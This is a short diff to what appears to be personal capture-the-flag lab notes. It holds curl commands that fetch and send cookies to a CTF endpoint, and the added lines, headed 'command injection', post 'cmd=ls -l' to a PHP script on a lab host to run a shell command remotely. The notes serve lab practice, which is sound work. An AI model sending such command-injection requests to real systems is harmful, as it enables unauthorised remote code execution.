@@ -10,3 +10,7 @@ curl --request GET -c cookielist. http://10.10.222.121:8081/ctf/getcookie
 curl -c - 10.10.128.183:8081/ctf/getcookie
 
 curl --cookie flagpls=flagpls http://10.10.222.121:8081/ctf/sendcookie
+
+command injection
+how many file current directory?
+curl -s --data-urlencode "cmd=ls -l" -X POST http://10.10.11.79/2591c98b70119fe624898b1e424b5e91.php | grep -v -e "^$" | grep -v "<"
